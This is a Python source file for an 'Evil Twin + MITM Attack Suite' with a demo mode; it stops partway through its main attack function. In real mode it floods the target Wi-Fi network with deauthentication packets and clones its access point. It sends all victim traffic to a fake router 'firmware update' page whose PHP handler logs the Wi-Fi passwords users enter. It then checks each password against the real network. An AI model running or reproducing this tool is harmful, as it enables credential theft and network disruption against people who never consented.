#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin + MITM - Full Attack Suite with Demo Mode
(Версия с дизайном из main.py и поддержкой вкладок)
"""

import os
import sys
import time
import subprocess
import signal
import threading
import random
import re
from datetime import datetime
import argparse

# Парсим аргументы командной строки
parser = argparse.ArgumentParser(description='Evil Twin + MITM Attack Suite')
parser.add_argument('--demo', action='store_true', help='Запустить в демо-режиме (без реальных атак)')
args = parser.parse_args()

DEMO_MODE = args.demo

# Цветовые схемы для терминала (из main.py)
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    BRIGHT_ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;202m'
    BRIGHT_RED = '\033[1;91m'
    DARK_RED = '\033[31m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'

    # Claude-style оранжево-белые градиенты
    CLAUDE_COLORS = [
        '\033[38;5;208m',  # Оранжевый
        '\033[38;5;214m',  # Светло-оранжевый
        '\033[38;5;223m',  # Бежевый
        '\033[38;5;231m',  # Белый
    ]

    @staticmethod
    def gradient(text, reverse=False, style='claude'):
        """Создает градиент"""
        if style == 'claude':
            colors = Colors.CLAUDE_COLORS
        else:
            colors = [
                '\033[38;5;196m',  # Яркий красный
                '\033[38;5;202m',  # Оранжево-красный
                '\033[38;5;208m',  # Оранжевый
                '\033[38;5;214m',  # Светло-оранжевый
                '\033[38;5;220m',  # Желтоватый
                '\033[38;5;226m',  # Светло-желтый
                '\033[38;5;231m',  # Белый
            ]

        if reverse:
            colors = colors[::-1]

        result = ""
        step = len(text) / len(colors) if len(text) > 0 else 1
        for i, char in enumerate(text):
            color_idx = min(int(i / step), len(colors) - 1)
            result += colors[color_idx] + char
        return result + Colors.RESET

    @staticmethod
    def animate_gradient(text, frame=0):
        """Анимированный переливающийся градиент"""
        colors = Colors.CLAUDE_COLORS
        result = ""
        for i, char in enumerate(text):
            color_idx = (i + frame) % len(colors)
            result += colors[color_idx] + char
        return result + Colors.RESET

    @staticmethod
    def rounded_box(width, height, title="", style='claude'):
        """Создает закругленную рамку с градиентом"""
        if style == 'claude':
            colors = Colors.CLAUDE_COLORS
        else:
            colors = ['\033[38;5;196m', '\033[38;5;208m', '\033[38;5;214m',
                     '\033[38;5;220m', '\033[38;5;226m', '\033[38;5;231m']

        # Символы для закругленной рамки
        tl = '╭'  # top-left
        tr = '╮'  # top-right
        bl = '╰'  # bottom-left
        br = '╯'  # bottom-right
        h = '─'   # horizontal
        v = '│'   # vertical

        lines = []

        # Верхняя граница с заголовком
        if title:
            title_len = len(title)
            left_pad = (width - title_len - 2) // 2
            right_pad = width - title_len - left_pad - 2
            top = tl + h * left_pad + f' {title} ' + h * right_pad + tr
        else:
            top = tl + h * (width - 2) + tr

        # Применяем градиент к верхней границе
        colored_top = ""
        step = len(top) / len(colors)
        for i, char in enumerate(top):
            color_idx = min(int(i / step), len(colors) - 1)
            colored_top += colors[color_idx] + char
        lines.append(colored_top + Colors.RESET)

        # Боковые границы
        for i in range(height):
            left_idx = int((i / height) * len(colors)) % len(colors)
            right_idx = int(((i + 1) / height) * len(colors)) % len(colors)
            line = colors[left_idx] + v + Colors.RESET + ' ' * (width - 2) + colors[right_idx] + v + Colors.RESET
            lines.append(line)

        # Нижняя граница
        bottom = bl + h * (width - 2) + br
        colored_bottom = ""
        step = len(bottom) / len(colors)
        for i, char in enumerate(bottom):
            color_idx = min(int(i / step), len(colors) - 1)
            colored_bottom += colors[color_idx] + char
        lines.append(colored_bottom + Colors.RESET)

        return lines


# Глобальные переменные
interface = None
monitor_interface = None
target_bssid = None
target_channel = None
target_ssid = None
target_encryption = None
gateway_ip = "10.0.0.1"
running = True
creds_file = "/tmp/captured_creds.txt"
http_log = "/tmp/http_intercept.log"
processes = []
current_page = 0  # 0 = WiFi, 1 = Ethernet

# Логи для Evil Twin
deauth_log = []
ap_log = []
captured_passwords = []
connected_clients = []

# Demo данные
demo_interfaces = ['wlan0', 'wlan1', 'wlan2']
demo_networks = [
    {'bssid': 'AA:BB:CC:DD:EE:01', 'channel': '6', 'power': '-45', 'encryption': 'WPA2', 'ssid': 'CoffeeShop_WiFi'},
    {'bssid': 'AA:BB:CC:DD:EE:02', 'channel': '11', 'power': '-62', 'encryption': 'WPA2', 'ssid': 'HomeNetwork_5G'},
    {'bssid': 'AA:BB:CC:DD:EE:03', 'channel': '1', 'power': '-58', 'encryption': 'WPA2', 'ssid': 'Office_Guest'},
    {'bssid': 'AA:BB:CC:DD:EE:04', 'channel': '6', 'power': '-71', 'encryption': 'WPA2', 'ssid': 'Guest_Network'},
    {'bssid': 'AA:BB:CC:DD:EE:05', 'channel': '3', 'power': '-80', 'encryption': 'WPA', 'ssid': 'OldRouter'},
]
demo_ethernet_connected = True
demo_gateway = '192.168.1.1'
demo_eth_interface = 'eth0'

# Директория шаблонов
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(SCRIPT_DIR, 'templates')


def banner():
    """Баннер программы в стиле main.py"""
    os.system('clear')
    demo_text = f" {Colors.CYAN}[DEMO MODE]{Colors.RESET}" if DEMO_MODE else ""
    
    banner_text = f"""
{Colors.gradient('╔═══════════════════════════════════════════════════════════╗', style='claude')}
{Colors.gradient('║', style='claude')}           EVIL TWIN + MITM ATTACK SUITE{demo_text}            {Colors.gradient('║', style='claude')}
{Colors.gradient('║', style='claude')}              Full Network Interception                    {Colors.gradient('║', style='claude')}
{Colors.gradient('╚═══════════════════════════════════════════════════════════╝', style='claude')}
"""
    print(banner_text)


def draw_tabs():
    """Рисует вкладки навигации в стиле main.py"""
    print(f"\n{Colors.gradient('═' * 60, style='claude')}")

    if current_page == 0:
        # WiFi активна
        wifi_tab = f"{Colors.BRIGHT_ORANGE}{Colors.BOLD}╭─< [Wi-fi] >─╮{Colors.RESET}"
        eth_tab = f"{Colors.DIM}│  Ethernet  │{Colors.RESET}"
        print(f"  {wifi_tab}  {eth_tab}")
        print(f"  {Colors.BRIGHT_ORANGE}│{Colors.RESET} {'─' * 13} {Colors.BRIGHT_ORANGE}│{Colors.RESET}  {Colors.DIM}│{Colors.RESET} {'─' * 10} {Colors.DIM}│{Colors.RESET}")
    else:
        # Ethernet активна
        wifi_tab = f"{Colors.DIM}│  Wi-fi  │{Colors.RESET}"
        eth_tab = f"{Colors.BRIGHT_ORANGE}{Colors.BOLD}╭─< [Ethernet] >─╮{Colors.RESET}"
        print(f"  {wifi_tab}  {eth_tab}")
        print(f"  {Colors.DIM}│{Colors.RESET} {'─' * 9} {Colors.DIM}│{Colors.RESET}  {Colors.BRIGHT_ORANGE}│{Colors.RESET} {'─' * 16} {Colors.BRIGHT_ORANGE}│{Colors.RESET}")

    print(f"{Colors.gradient('═' * 60, style='claude')}\n")


def wifi_page():
    """Страница WiFi атак"""
    print(f"{Colors.ORANGE}[WiFi Attack Options]{Colors.RESET}\n")
    print(f"  {Colors.WHITE}[1]{Colors.RESET} Scan Networks")
    print(f"  {Colors.WHITE}[2]{Colors.RESET} Launch Evil Twin Attack")
    print(f"  {Colors.WHITE}[3]{Colors.RESET} View Captured Credentials")
    print(f"  {Colors.WHITE}[4]{Colors.RESET} View HTTP Intercept Log")
    print(f"\n{Colors.DIM}Press TAB to switch tabs | Ctrl+C to stop attack{Colors.RESET}")


def ethernet_page():
    """Страница Ethernet атак"""
    if DEMO_MODE:
        status = f"{Colors.GREEN}Connected{Colors.RESET}" if demo_ethernet_connected else f"{Colors.RED}Disconnected{Colors.RESET}"
        print(f"{Colors.CYAN}[Ethernet Status: {status} | Gateway: {demo_gateway}]{Colors.RESET}\n")

    print(f"{Colors.ORANGE}[Ethernet/LAN Attack Options]{Colors.RESET}\n")
    print(f"  {Colors.WHITE}[1]{Colors.RESET} ARP Spoofing Attack")
    print(f"  {Colors.WHITE}[2]{Colors.RESET} HTTP/HTTPS Credential Sniffer")
    print(f"  {Colors.WHITE}[3]{Colors.RESET} DNS Spoofing")
    print(f"  {Colors.WHITE}[4]{Colors.RESET} View Intercepted Data")
    print(f"  {Colors.WHITE}[5]{Colors.RESET} Full MITM (ARP + Sniff + Log)")
    print(f"\n{Colors.DIM}Press TAB to switch tabs | Ctrl+C to stop attack{Colors.RESET}")


def show_current_page():
    """Отображает текущую страницу"""
    banner()
    draw_tabs()

    if current_page == 0:
        wifi_page()
    else:
        ethernet_page()


class NetworkInterface:
    """Управление сетевыми интерфейсами (из main.py)"""

    @staticmethod
    def get_interfaces():
        """Получить список Wi-Fi интерфейсов"""
        if DEMO_MODE:
            return demo_interfaces[:2]

        interfaces = []
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.strip().split()[-1]
                    if iface and iface not in interfaces:
                        interfaces.append(iface)
        except:
            pass

        if not interfaces:
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.DEVNULL, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        parts = line.strip().split()
                        if parts:
                            iface = parts[0]
                            if iface and iface not in interfaces and not iface.startswith('lo'):
                                interfaces.append(iface)
            except:
                pass

        return interfaces

    @staticmethod
    def is_monitor_mode(interface):
        """Проверка режима монитора"""
        if DEMO_MODE:
            return False

        try:
            if 'mon' in interface:
                return True
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, stderr=subprocess.DEVNULL)
            return 'Mode:Monitor' in result.stdout
        except:
            return False

    @staticmethod
    def enable_monitor_mode(interface):
        """Включить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Включение monitor mode на {interface}...{Colors.RESET}")
            time.sleep(1)
            return True

        try:
            result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True, timeout=5)
            if 'state DOWN' in result.stdout or 'DOWN' in result.stdout:
                print(f"{Colors.WHITE}[*] Interface {interface} is DOWN, bringing it UP...{Colors.RESET}")
                subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True, timeout=5)
                time.sleep(1)

            print(f"{Colors.WHITE}[*] Killing interfering processes...{Colors.RESET}")
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=10)

            print(f"{Colors.WHITE}[*] Starting monitor mode on {interface}...{Colors.RESET}")
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)

            time.sleep(2)
            mon_interface = interface + 'mon'
            check_result = subprocess.run(['iwconfig', mon_interface], capture_output=True, text=True, stderr=subprocess.DEVNULL)

            if check_result.returncode == 0:
                print(f"{Colors.WHITE}[✓] Monitor mode enabled: {mon_interface}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.ORANGE}[!] Warning: Could not verify monitor mode{Colors.RESET}")
                return True
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error enabling monitor mode: {e}{Colors.RESET}")
            return False

    @staticmethod
    def disable_monitor_mode(interface):
        """Выключить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Выключение monitor mode на {interface}...{Colors.RESET}")
            time.sleep(1)
            return True

        try:
            subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, text=True, timeout=10)
            if 'mon' in interface:
                base_iface = interface.replace('mon', '')
                subprocess.run(['airmon-ng', 'stop', base_iface], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True, timeout=10)
            time.sleep(2)
            return True
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error disabling monitor mode: {e}{Colors.RESET}")
            return False


class APScanner:
    """Сканер точек доступа (из main.py)"""

    def __init__(self, interface):
        self.interface = interface
        self.networks = []
        self.process = None
        self.stop_scan = False

    def scan(self):
        """Запуск сканирования"""
        self.stop_scan = False

        if DEMO_MODE:
            return self.demo_scan()

        print(f"\n{Colors.ORANGE}[*] Starting scan on {self.interface}...{Colors.RESET}")

        self.temp_file = f"/tmp/scan_{int(time.time())}"

        cmd = ['airodump-ng', '--write', self.temp_file, '--write-interval', '1', '--output-format', 'csv', self.interface]

        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Failed to start airodump-ng: {e}{Colors.RESET}")
            return []

        print(f"\n{Colors.ORANGE}[*] Scanning networks...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80, style='claude')}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80, style='claude')}")

        scan_start = time.time()
        last_display = 0

        while not self.stop_scan:
            try:
                if self.process.poll() is not None:
                    break

                csv_file = f"{self.temp_file}-01.csv"
                if os.path.exists(csv_file):
                    self.networks = self.parse_csv(csv_file)

                    if time.time() - last_display > 1:
                        self.display_networks()
                        last_display = time.time()

                if time.time() - scan_start > 30 and not self.networks:
                    print(f"\n{Colors.ORANGE}[!] No networks found yet.{Colors.RESET}")

                time.sleep(0.5)
            except KeyboardInterrupt:
                self.stop_scan = True
                break
            except Exception as e:
                print(f"\n{Colors.ORANGE}[!] Scan error: {e}{Colors.RESET}")
                break

        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                self.process.kill()

        return self.networks

    def demo_scan(self):
        """Демо сканирование"""
        print(f"\n{Colors.ORANGE}[DEMO] Сканирование сетей...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Нажмите Ctrl+C для остановки{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80, style='claude')}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80, style='claude')}")

        for i, net in enumerate(demo_networks, 1):
            if self.stop_scan:
                break
            self.networks.append(net)
            self.display_networks()
            time.sleep(0.3)

        return self.networks

    def parse_csv(self, csv_file):
        """Парсинг CSV файла"""
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()

            in_ap_section = False
            for line in lines:
                if 'BSSID' in line and 'First time seen' in line:
                    in_ap_section = True
                    continue
                if 'Station MAC' in line:
                    break
                if in_ap_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        enc = parts[5].strip()
                        ssid = parts[13].strip()

                        if bssid:
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'encryption': enc,
                                'ssid': ssid if ssid else '<Hidden>'
                            })
        except:
            pass

        return networks

    def display_networks(self):
        """Отображение найденных сетей"""
        os.system('clear')
        print(f"\n{Colors.BRIGHT_RED}[*] Найдено сетей: {len(self.networks)}{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Нажмите Ctrl+C для остановки{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80, style='claude')}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80, style='claude')}")

        for i, net in enumerate(self.networks[:20], 1):
            color = Colors.WHITE if int(net['power']) > -70 else Colors.DIM
            print(f"{color}{i:>3} {net['bssid']:^17} {net['channel']:^4} {net['power']:^5} {net['encryption']:^8} {net['ssid']:<32}{Colors.RESET}")


class EvilTwinAttack:
    """Класс для Evil Twin атаки (дизайн из main.py)"""

    def __init__(self, ap_interface, deauth_interface, target):
        self.ap_interface = ap_interface
        self.deauth_interface = deauth_interface
        self.target = target
        self.clients = []
        self.deauth_thread = None
        self.verification_thread = None
        self.animation_frame = 0
        self.correct_password = None
        self.attack_successful = False
        self.deauth_status = "Deauthenticating..."
        self.ap_status = "Starting..."

    def update_animation_frame(self):
        self.animation_frame = (self.animation_frame + 1) % len(Colors.CLAUDE_COLORS)

    def create_html_portal(self, template_name='default'):
        """Создание HTML страницы для фишинга"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Создание HTML портала из шаблона {template_name}...{Colors.RESET}")
            time.sleep(0.5)
            return

        template_path = f'{TEMPLATES_DIR}/{template_name}.html'

        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                html_content = f.read()
        else:
            html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #333; font-size: 24px; margin-bottom: 10px; text-align: center; }
        .subtitle { color: #666; font-size: 14px; text-align: center; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        input[type="password"] {
            width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0;
            border-radius: 8px; font-size: 16px; transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none; border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%; padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; border-radius: 8px;
            font-size: 16px; font-weight: 600; cursor: pointer;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }
    </style>
</head>
<body>
    <div class="container">
        <h1>Firmware Update Required</h1>
        <p class="subtitle">A new security update is available</p>
        <form action="verify.php" method="POST">
            <div class="input-group">
                <label for="password">Wi-Fi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit">Verify & Continue</button>
        </form>
    </div>
</body>
</html>"""

        php_content = """<?php
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log_file = '/tmp/evil_twin_passwords.txt';
$log_entry = "$time | IP: $ip | Password: $password\\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);
header('Location: https://www.google.com');
exit();
?>"""

        os.makedirs('/tmp/portal', exist_ok=True)
        with open('/tmp/portal/index.html', 'w') as f:
            f.write(html_content)
        with open('/tmp/portal/verify.php', 'w') as f:
            f.write(php_content)
        subprocess.run(['touch', '/tmp/evil_twin_passwords.txt'])
        subprocess.run(['chmod', '777', '/tmp/evil_twin_passwords.txt'])

    def setup_ap(self):
        """Настройка точки доступа"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Настройка Evil Twin AP...{Colors.RESET}")
            time.sleep(0.5)
            return

        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ssid={self.target['ssid']}
hw_mode=g
channel={self.target['channel']}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
"""
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"""interface={self.ap_interface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)

        subprocess.run(['ifconfig', self.ap_interface, 'down'])
        subprocess.run(['ifconfig', self.ap_interface, '10.0.0.1', 'netmask', '255.255.255.0'])
        subprocess.run(['ifconfig', self.ap_interface, 'up'])
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        subprocess.run(['iptables', '--flush'])
        subprocess.run(['iptables', '-t', 'nat', '--flush'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])

    def start_services(self):
        """Запуск сервисов"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Запуск сервисов...{Colors.RESET}")
            time.sleep(0.5)
            return

        subprocess.run(['systemctl', 'start', 'apache2'])
        subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(['hostapd', '/tmp/hostapd.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def get_clients(self):
        """Получить список клиентов"""
        if DEMO_MODE:
            return ['11:22:33:44:55:66', '77:88:99:AA:BB:CC', 'DD:EE:FF:00:11:22']

        try:
            result = subprocess.run(['airodump-ng', '-c', self.target['channel'], '--bssid', self.target['bssid'], '-w', '/tmp/clients', '--write-interval', '5', '--output-format', 'csv', self.deauth_interface], capture_output=True, text=True, timeout=10)

            csv_file = '/tmp/clients-01.csv'
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    lines = f.readlines()

                in_client_section = False
                clients = []
                for line in lines:
                    if 'Station MAC' in line:
                        in_client_section = True
                        continue
                    if in_client_section and line.strip():
                        parts = line.split(',')
                        if len(parts) >= 1:
                            client_mac = parts[0].strip()
                            if client_mac and ':' in client_mac:
                                clients.append(client_mac)
                return clients
        except:
            pass
        return []

    def deauth_clients(self, stop_event):
        """Деаутентификация клиентов"""
        global deauth_log

        while not stop_event.is_set():
            self.deauth_status = "Deauthenticating... (broadcast)"

            if DEMO_MODE:
                timestamp = datetime.now().strftime('%H:%M:%S')
                deauth_log.append(f"[{timestamp}] Broadcast deauth -> {self.target['ssid']}")
                if len(deauth_log) > 50:
                    deauth_log.pop(0)

                if random.random() > 0.7:
                    fake_mac = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(6)])
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    deauth_log.append(f"[{timestamp}] Discovered client: {fake_mac}")
                    if len(deauth_log) > 50:
                        deauth_log.pop(0)

                time.sleep(2)
                continue

            try:
                subprocess.run(['aireplay-ng', '--deauth', '5', '-a', self.target['bssid'], self.deauth_interface], capture_output=True, timeout=2)
                timestamp = datetime.now().strftime('%H:%M:%S')
                deauth_log.append(f"[{timestamp}] Broadcast deauth → {self.target['ssid']}")
                if len(deauth_log) > 50:
                    deauth_log.pop(0)
            except:
                pass

            for client in self.clients:
                if stop_event.is_set():
                    break
                try:
                    subprocess.run(['aireplay-ng', '--deauth', '3', '-a', self.target['bssid'], '-c', client, self.deauth_interface], capture_output=True, timeout=2)
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    deauth_log.append(f"[{timestamp}] Deauth client: {client}")
                    if len(deauth_log) > 50:
                        deauth_log.pop(0)
                except:
                    pass

            time.sleep(2)

    def monitor_passwords(self, stop_event):
        """Мониторинг паролей"""
        global ap_log, captured_passwords

        self.ap_status = "Hosting..."

        if DEMO_MODE:
            demo_passwords = ['Password123', 'MyWiFi2024', 'SecureNet456', 'HomeRouter789']
            demo_ips = ['192.168.1.101', '192.168.1.102', '192.168.1.103', '192.168.1.104']

            password_idx = 0
            while not stop_event.is_set() and not self.attack_successful:
                wait_time = random.randint(5, 10)
                time.sleep(wait_time)

                if stop_event.is_set() or self.attack_successful:
                    break

                if password_idx < len(demo_passwords):
                    password = demo_passwords[password_idx]
                    ip = demo_ips[password_idx]

                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    fake_log_line = f"{timestamp} | IP: {ip} | Password: {password}"
                    captured_passwords.append(fake_log_line)

                    timestamp = datetime.now().strftime('%H:%M:%S')
                    ap_log.append(f"[{timestamp}] Connected client: {ip}")
                    ap_log.append(f"[{timestamp}] Password received: {password}")
                    if len(ap_log) > 50:
                        ap_log.pop(0)
                        ap_log.pop(0)

                    # Проверяем пароль (в демо режиме 30% шанс успеха)
                    if random.random() > 0.7 or len(captured_passwords) >= 3:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        ap_log.append(f"[{timestamp}] PASSWORD CORRECT: {password}")
                        self.correct_password = password
                        self.attack_successful = True
                        return

                    password_idx += 1

            return

        last_size = 0
        while not stop_event.is_set() and not self.attack_successful:
            try:
                if os.path.exists('/tmp/evil_twin_passwords.txt'):
                    current_size = os.path.getsize('/tmp/evil_twin_passwords.txt')
                    if current_size > last_size:
                        with open('/tmp/evil_twin_passwords.txt', 'r') as f:
                            lines = f.readlines()

                        new_lines = lines[len(captured_passwords):]
                        for line in new_lines:
                            captured_passwords.append(line.strip())

                            match = re.search(r'Password: (.+)', line)
                            ip_match = re.search(r'IP: ([\d.]+)', line)

                            if match:
                                password = match.group(1)
                                ip = ip_match.group(1) if ip_match else 'Unknown'

                                timestamp = datetime.now().strftime('%H:%M:%S')
                                ap_log.append(f"[{timestamp}] Connected client: {ip}")
                                ap_log.append(f"[{timestamp}] Password received: {password}")
                                if len(ap_log) > 50:
                                    ap_log.pop(0)
                                    ap_log.pop(0)

                                # Проверяем пароль
                                if self.verify_password(password, stop_event):
                                    return

                        last_size = current_size
            except:
                pass

            time.sleep(1)

    def verify_password(self, password, stop_event):
        """Проверка пароля"""
        global ap_log

        timestamp = datetime.now().strftime('%H:%M:%S')
        ap_log.append(f"[{timestamp}] Testing password: {password}")
        self.deauth_status = f"Connecting to {self.target['ssid']}..."
        stop_event.set()

        if DEMO_MODE:
            time.sleep(3)
            if random.random() > 0.7 or len(captured_passwords) >= 3:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] PASSWORD CORRECT: {password}")
                self.correct_password = password
                self.attack_successful = True
                return True
            else:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] Password incorrect")
                self.deauth_status = "Deauthenticating... (broadcast)"
                stop_event.clear()
                return False

        time.sleep(2)

        wpa_conf = f"""network={{
    ssid="{self.target['ssid']}"
    psk="{password}"
}}"""

        with open('/tmp/wpa_test.conf', 'w') as f:
            f.write(wpa_conf)

        try:
            proc = subprocess.Popen(['wpa_supplicant', '-i', self.deauth_interface.replace('mon', ''), '-c', '/tmp/wpa_test.conf'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(10)
            proc.terminate()

            result = subprocess.run(['iwconfig', self.deauth_interface.replace('mon', '')], capture_output=True, text=True)

            if self.target['ssid'] in result.stdout:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] PASSWORD CORRECT: {password}")
                self.correct_password = password
                self.attack_successful = True
                return True
            else:
                timestamp = datetime.now().strftime('%H:%M:%S')
                ap_log.append(f"[{timestamp}] Password incorrect")
                self.deauth_status = "Deauthenticating... (broadcast)"
                stop_event.clear()
                return False
        except:
            timestamp = datetime.now().strftime('%H:%M:%S')
            ap_log.append(f"[{timestamp}] Verification failed")
            self.deauth_status = "Deauthenticating... (broadcast)"
            stop_event.clear()
            return False


def run_evil_twin_attack():
    """Запуск Evil Twin атаки с дизайном из main.py"""
    global deauth_log, ap_log, captured_passwords

    # Получаем интерфейсы
    interfaces = NetworkInterface.get_interfaces()

    if len(interfaces) < 2:
        print(f"\n{Colors.ORANGE}[!] Требуется минимум 2 Wi-Fi адаптера!{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Найдено адаптеров: {len(interfaces)}{Colors.RESET}")
        input(f"\n{Colors.WHITE}Нажмите Enter для возврата...{Colors.RESET}")
        return

    # Выбор адаптера для точки доступа
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Выберите адаптер для Evil Twin AP:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        print(f"{Colors.WHITE}[{i}] {iface}{Colors.RESET}")

    ap_choice = input(f"\n{Colors.WHITE}Выбор: {Colors.RESET}")
    try:
        ap_interface = interfaces[int(ap_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return

    # Выбор адаптера для деаутентификации
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Выберите адаптер для деаутентификации:{Colors.RESET}\n")
    for i, iface in enumerate(interfaces, 1):
        if iface != ap_interface:
            print(f"{Colors.WHITE}[{i}] {iface}{Colors.RESET}")

    deauth_choice = input(f"\n{Colors.WHITE}Выбор: {Colors.RESET}")
    try:
        deauth_interface = interfaces[int(deauth_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return

    if ap_interface == deauth_interface:
        print(f"{Colors.ORANGE}[!] Адаптеры должны быть разными!{Colors.RESET}")
        time.sleep(2)
        return

    # Выбор шаблона
    os.system('clear')
    templates = ['default']  # Упрощённо
    print(f"\n{Colors.ORANGE}[*] Выберите шаблон фишинговой страницы:{Colors.RESET}\n")
    for i, template in enumerate(templates, 1):
        print(f"{Colors.WHITE}[{i}] {template}{Colors.RESET}")

    template_choice = input(f"\n{Colors.WHITE}Выбор (Enter для default): {Colors.RESET}")
    selected_template = 'default'

    # Включаем monitor mode
